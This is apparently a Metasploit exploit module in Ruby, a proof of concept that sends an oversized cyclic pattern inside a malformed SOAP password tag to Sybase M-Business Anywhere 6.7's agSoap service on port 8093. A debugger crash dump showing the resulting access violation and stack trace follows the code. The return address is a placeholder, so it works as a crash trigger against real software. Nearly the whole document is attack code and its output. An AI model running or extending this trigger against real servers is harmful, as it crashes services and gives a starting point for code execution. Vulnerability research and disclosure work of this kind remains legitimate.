require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Sybase M-Business Anywhere agSoap.exe password Tag PoC',
			'Description'    => %q{
					This module is simply a trigger for the Sybase M-Business Anywhere 6.7
				agSoap.exe password tag issue.
			},
			'Author'         => [ 'Mario Ceballos' ],
			'License'        => 'BSD_LICENSE',
			'References'     =>
				[
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-11-154/' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 550,
					'BadChars' => "\x00",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'MBAnyWhereW 6.7', { 'Ret' => 0x41414141 } ],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'May 9 2011'))

		register_options( [ Opt::RPORT(8093) ], self.class )
	end

	def exploit

		trigger = pattern_create(2524)

		xml = %Q|
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" 
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
xmlns:xsd="http://www.w3.org/2001/XMLSchema">
<soap:Body>
<loginUser xmlns="urn:AvantgoWebAPI">
<userName></userName>
<password></#{trigger}>
</loginUser>
</soap:Body>
</soap:Envelope> 
		|

		print_status("Trying target #{target.name}...")

		send_request_cgi({
			'uri'		=> '/agsoap',
			'method'	=> 'POST',
			'cytpe'		=> 'application/soap+xml; charset=utf-8',
			'version'	=> '1.1',
			'data'		=> xml
			}, 3)

	end

end
__END__
(f5c.f70): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00020000 ebx=00000005 ecx=77bcfea0 edx=7c82847c esi=6b43316b edi=00000063
eip=00a8aab3 esp=00dffe90 ebp=004b4a38 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
*** WARNING: Unable to verify checksum for C:\M-BusinessAnywhereServer\bin\mod_agsoap.dll
mod_agsoap!soap_clr_attr+0x53:
00a8aab3 66c746040000    mov     word ptr [esi+4],0       ds:0023:6b43316f=????
0:004> k
ChildEBP RetAddr  
00dffe90 00a870bd mod_agsoap!soap_clr_attr+0x53 [gsoap/stdsoap2.c @ 5891]
00dffea4 00a92061 mod_agsoap!soap_begin_count+0xd [gsoap/stdsoap2.c @ 3809]
00dffebc 00a927ef mod_agsoap!soap_send_fault+0xb1 [gsoap/stdsoap2.c @ 10536]
00dffecc 00a815f0 mod_agsoap!soap_serve+0x8f [gsoap/soapServer.c @ 34]
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\M-BusinessAnywhereServer\bin\agcore.dll - 
00dffef8 6002ebe5 mod_agsoap!SmackHandler+0x100 [mod_agsmack.c @ 516]
WARNING: Stack unwind information not available. Following frames may be wrong.
00dfff14 6003d13a agcore!ap_create_per_dir_config+0x1e5
00dfff24 6003cde6 agcore!ap_some_auth_required+0x3ca
00dfff34 600350f7 agcore!ap_some_auth_required+0x76
00dfff7c 60034f4a agcore!ap_exists_scoreboard_image+0x597
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\WINDOWS\system32\kernel32.dll - 
00dfffb8 77e6482f agcore!ap_exists_scoreboard_image+0x3ea
00dfffec 00000000 kernel32!GetModuleHandleA+0xdf
